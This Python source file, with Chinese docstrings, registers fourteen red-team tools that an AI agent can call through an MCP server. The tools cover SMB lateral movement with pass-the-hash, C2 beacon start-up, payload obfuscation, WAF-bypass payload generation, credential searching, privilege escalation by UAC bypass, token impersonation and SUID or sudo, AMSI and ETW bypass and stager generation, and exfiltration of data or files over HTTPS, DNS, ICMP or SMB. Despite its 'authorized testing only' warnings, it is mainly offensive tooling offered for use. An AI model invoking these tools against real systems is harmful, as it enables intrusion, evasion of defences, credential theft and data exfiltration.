"""
红队工具处理器
包含: lateral_smb, c2_beacon_start, payload_obfuscate, credential_find,
      privilege_check, privilege_escalate, exfiltrate_data, exfiltrate_file
"""

from typing import Any, Dict, List
from .tooling import tool
from .error_handling import (
    handle_errors,
    ErrorCategory,
    extract_target,
    extract_file_path,
)

from core.exceptions import (
    # 横向移动错误
    LateralError,
    SMBError,
    SSHError,
    WMIError,
    # C2错误
    C2Error,
    BeaconError,
    TunnelError,
    # 检测器/Payload错误
    PayloadError,
    # 认证错误
    AuthError,
    InvalidCredentials,
    # 权限提升错误
    PrivilegeEscalationError,
    EscalationVectorNotFound,
    InsufficientPrivilege,
    # 数据外泄错误
    ExfiltrationError,
    ChannelBlocked,
    ChannelConnectionError,
    # 通用错误
    AutoRedTeamError,
    ValidationError,
    ConfigError,
)


def register_redteam_tools(mcp, counter, logger):
    """注册红队相关工具

    Args:
        mcp: FastMCP实例
        counter: ToolCounter实例
        logger: Logger实例
    """

    @tool(mcp)
    @handle_errors(logger, ErrorCategory.REDTEAM, extract_target)
    async def lateral_smb(
        target: str,
        username: str,
        password: str = None,
        ntlm_hash: str = None,
        command: str = "whoami"
    ) -> Dict[str, Any]:
        """SMB横向移动 - 通过SMB执行远程命令

        支持: 密码认证、Pass-the-Hash
        警告: 仅限授权渗透测试使用！

        Args:
            target: 目标IP
            username: 用户名
            password: 密码 (与ntlm_hash二选一)
            ntlm_hash: NTLM Hash (格式: LM:NT)
            command: 要执行的命令

        Returns:
            执行结果
        """
        from core.lateral.smb_lateral import smb_exec

        return smb_exec(
            target=target,
            username=username,
            password=password or "",
            ntlm_hash=ntlm_hash or "",
            command=command
        )

    @tool(mcp)
    @handle_errors(logger, ErrorCategory.REDTEAM, lambda a, kw: {'server': kw.get('server') or (a[0] if a else None)})
    async def c2_beacon_start(
        server: str,
        port: int = 443,
        protocol: str = "https",
        interval: float = 60.0
    ) -> Dict[str, Any]:
        """启动C2 Beacon - 创建到C2服务器的Beacon连接

        警告: 仅限授权渗透测试使用！

        Args:
            server: C2服务器地址
            port: 端口
            protocol: 协议 (http, https)
            interval: 心跳间隔(秒)

        Returns:
            Beacon状态
        """
        from core.c2.beacon import create_beacon

        beacon = create_beacon(
            server=server,
            port=port,
            protocol=protocol,
            interval=interval
        )

        if beacon.connect():
            beacon.start()
            return {
                'success': True,
                'beacon_id': beacon.beacon_id,
                'status': beacon.status.value,
                'server': server
            }

        return {'success': False, 'error': 'Connection failed', 'server': server}

    @tool(mcp)
    @handle_errors(logger, ErrorCategory.REDTEAM)
    async def payload_obfuscate(payload: str, technique: str = "xor") -> Dict[str, Any]:
        """Payload混淆 - 对payload进行混淆处理

        支持技术: xor, base64, aes, custom
        警告: 仅限授权渗透测试使用！

        Args:
            payload: 原始payload
            technique: 混淆技术

        Returns:
            混淆后的payload
        """
        from core.evasion.payload_obfuscator import obfuscate_payload

        result = obfuscate_payload(payload, technique=technique)

        return {
            'success': True,
            'original_length': len(payload),
            'obfuscated_length': len(result),
            'technique': technique,
            'obfuscated': result
        }

    @tool(mcp)
    @handle_errors(logger, ErrorCategory.REDTEAM)
    async def waf_bypass(
        payload: str,
        waf_name: str = None,
        max_variants: int = 30,
        include_headers: bool = False,
        include_paths: bool = False,
        path: str = "/"
    ) -> Dict[str, Any]:
        """WAF绕过Payload生成 - 生成变异Payload与绕过方案

        Args:
            payload: 原始payload
            waf_name: WAF名称 (可选)
            max_variants: 最大变体数量
            include_headers: 是否返回头部绕过方案
            include_paths: 是否返回路径绕过变体
            path: 目标路径

        Returns:
            WAF绕过结果
        """
        from core.evasion.waf_bypass_engine import WAFBypassEngine, normalize_waf_type

        engine = WAFBypassEngine()
        waf_type = normalize_waf_type(waf_name)
        variants = engine.generate_bypass(payload, waf_type, max_variants=max_variants)

        data = {
            'success': True,
            'waf_type': waf_type.value,
            'payload': payload,
            'variants': [
                {
                    'payload': v.bypassed_payload,
                    'technique': v.technique.value,
                    'confidence': v.confidence
                }
                for v in variants
            ],
            'count': len(variants)
        }

        if include_headers:
            data['header_bypass'] = engine.generate_header_bypass(path=path)
        if include_paths:
            data['path_bypass'] = engine.generate_path_bypass(path=path)

        return data

    @tool(mcp)
    @handle_errors(logger, ErrorCategory.REDTEAM, lambda a, kw: {'path': kw.get('path') or (a[0] if a else None)})
    async def credential_find(path: str = None, patterns: List[str] = None) -> Dict[str, Any]:
        """凭证发现 - 在文件中搜索敏感凭证

        搜索: API密钥、密码、令牌、私钥等
        警告: 仅限授权渗透测试使用！

        Args:
            path: 搜索路径
            patterns: 自定义搜索模式

        Returns:
            发现的凭证
        """
        from core.credential.password_finder import find_secrets

        results = find_secrets(path=path, patterns=patterns)

        return {
            'success': True,
            'path': path,
            'findings': results if isinstance(results, list) else [results],
            'total': len(results) if isinstance(results, list) else 1
        }

    # ==================== 权限提升工具 ====================

    @tool(mcp)
    @handle_errors(logger, ErrorCategory.REDTEAM)
    async def privilege_check() -> Dict[str, Any]:
        """检查当前权限级别 - 获取当前系统权限和可用提权向量

        警告: 仅限授权渗透测试使用！

        Returns:
            当前权限级别和可用提权向量列表
        """
        from core.privilege_escalation import get_escalation_module

        module = get_escalation_module()
        level = module.check_current_privilege()
        vectors = module.enumerate_vectors()

        return {
            'success': True,
            'current_level': level.value,
            'vectors': vectors,
            'platform': module.platform,
            'vectors_count': len(vectors)
        }

    @tool(mcp)
    @handle_errors(logger, ErrorCategory.REDTEAM, lambda a, kw: {'method': kw.get('method', 'auto')})
    async def privilege_escalate(
        method: str = "auto",
        timeout: float = 60.0
    ) -> Dict[str, Any]:
        """执行权限提升 - 尝试提升系统权限

        支持方法:
        - Windows: uac_bypass (fodhelper/eventvwr/sdclt), token_impersonation
        - Linux: suid, sudo, capability

        警告: 仅限授权渗透测试使用！

        Args:
            method: 提权方法 (auto, uac_bypass, token_impersonation, suid, sudo)
            timeout: 超时时间(秒)

        Returns:
            提权结果
        """
        from core.privilege_escalation import (
            get_escalation_module,
            EscalationMethod,
            EscalationConfig
        )

        config = EscalationConfig(timeout=timeout)
        module = get_escalation_module(config)

        if method == "auto":
            result = module.auto_escalate()
        else:
            result = module.escalate(EscalationMethod(method))

        return {
            'success': result.success,
            'method': result.method.value,
            'from_level': result.from_level.value,
            'to_level': result.to_level.value,
            'output': result.output,
            'error': result.error,
            'duration': result.duration,
            'evidence': result.evidence
        }

    # ==================== 后渗透工具 ====================

    @tool(mcp)
    @handle_errors(logger, ErrorCategory.REDTEAM)
    async def post_exploit_amsi_bypass(technique: str = None) -> Dict[str, Any]:
        """AMSI绕过 - 生成AMSI绕过代码

        Args:
            technique: 绕过技术 (可选)

        Returns:
            AMSI绕过代码
        """
        from core.post_exploit import get_amsi_bypass

        return {
            'success': True,
            'technique': technique or 'auto',
            'code': get_amsi_bypass(technique)
        }

    @tool(mcp)
    @handle_errors(logger, ErrorCategory.REDTEAM)
    async def post_exploit_etw_bypass() -> Dict[str, Any]:
        """ETW绕过 - 获取ETW Patch代码"""
        from core.post_exploit.advanced_techniques import ETWBypass

        return {
            'success': True,
            'code': ETWBypass.PS_ETW_BYPASS
        }

    @tool(mcp)
    @handle_errors(logger, ErrorCategory.REDTEAM)
    async def post_exploit_stager(
        payload_type: str = "powershell",
        include_amsi_bypass: bool = True,
        include_etw_bypass: bool = True
    ) -> Dict[str, Any]:
        """生成后渗透stager代码"""
        from core.post_exploit import PostExploitManager

        manager = PostExploitManager()
        stager = manager.generate_stager(
            payload_type=payload_type,
            include_amsi_bypass=include_amsi_bypass,
            include_etw_bypass=include_etw_bypass
        )

        return {
            'success': True,
            'payload_type': payload_type,
            'stager': stager
        }

    @tool(mcp)
    @handle_errors(logger, ErrorCategory.REDTEAM)
    async def post_exploit_evasion_chain(target_os: str = "windows") -> Dict[str, Any]:
        """获取推荐的后渗透规避链"""
        from core.post_exploit import PostExploitManager

        manager = PostExploitManager()
        chain = manager.get_evasion_chain(target_os=target_os)

        return {
            'success': True,
            'target_os': target_os,
            'chain': chain
        }

    @tool(mcp)
    @handle_errors(logger, ErrorCategory.REDTEAM)
    async def post_exploit_privesc_suggest(
        current_privileges: List[str],
        target_os: str = "windows"
    ) -> Dict[str, Any]:
        """根据当前权限建议提权路径"""
        from core.post_exploit import PostExploitManager

        manager = PostExploitManager()
        suggestions = manager.suggest_privesc(
            current_privileges=current_privileges,
            target_os=target_os
        )

        return {
            'success': True,
            'target_os': target_os,
            'suggestions': suggestions
        }

    # ==================== 数据外泄工具 ====================

    @tool(mcp)
    @handle_errors(logger, ErrorCategory.REDTEAM, lambda a, kw: {'channel': kw.get('channel', 'https')})
    async def exfiltrate_data(
        data: str,
        channel: str = "https",
        destination: str = "",
        encryption: bool = True,
        dns_domain: str = "",
        nameserver: str = ""
    ) -> Dict[str, Any]:
        """数据外泄 - 通过加密通道外泄数据

        支持通道:
        - https: HTTPS POST请求
        - dns: DNS子域名编码
        - icmp: ICMP Echo请求 (需要root)
        - smb: SMB文件共享

        警告: 仅限授权渗透测试使用！

        Args:
            data: 要外泄的数据 (Base64编码)
            channel: 外泄通道
            destination: 目标地址 (HTTP/SMB 为目标地址，DNS 为域名)
            encryption: 是否加密
            dns_domain: DNS 外泄域名 (destination 为 nameserver 时需显式设置)
            nameserver: DNS nameserver IP (可选)

        Returns:
            外泄结果
        """
        import base64
        from core.exfiltration import ExfilFactory, ExfilConfig, ExfilChannel

        config = ExfilConfig(
            channel=ExfilChannel(channel),
            destination=destination,
            encryption=encryption,
            dns_domain=dns_domain,
            nameserver=nameserver or None,
        )

        module = ExfilFactory.create(config)
        raw_data = base64.b64decode(data)
        result = module.exfiltrate(raw_data)

        return result.to_dict()

    @tool(mcp)
    @handle_errors(logger, ErrorCategory.REDTEAM, extract_file_path)
    async def exfiltrate_file(
        file_path: str,
        channel: str = "https",
        destination: str = "",
        dns_domain: str = "",
        nameserver: str = ""
    ) -> Dict[str, Any]:
        """文件外泄 - 外泄指定文件

        警告: 仅限授权渗透测试使用！

        Args:
            file_path: 文件路径
            channel: 外泄通道 (https, dns, icmp, smb)
            destination: 目标地址 (HTTP/SMB 为目标地址，DNS 为域名)
            dns_domain: DNS 外泄域名 (destination 为 nameserver 时需显式设置)
            nameserver: DNS nameserver IP (可选)

        Returns:
            外泄结果
        """
        from pathlib import Path
        from core.exfiltration import ExfilFactory, ExfilConfig, ExfilChannel

        path = Path(file_path)
        if not path.exists():
            return {'success': False, 'error': f'文件不存在: {file_path}', 'file_path': file_path}

        config = ExfilConfig(
            channel=ExfilChannel(channel),
            destination=destination,
            encryption=True,
            dns_domain=dns_domain,
            nameserver=nameserver or None,
        )

        module = ExfilFactory.create(config)
        data = path.read_bytes()
        result = module.exfiltrate(data)

        return {
            **result.to_dict(),
            'file': str(path),
            'file_size': len(data)
        }

    counter.add('redteam', 14)
    logger.info("[RedTeam] 已注册 14 个红队工具 (含WAF绕过与后渗透)")
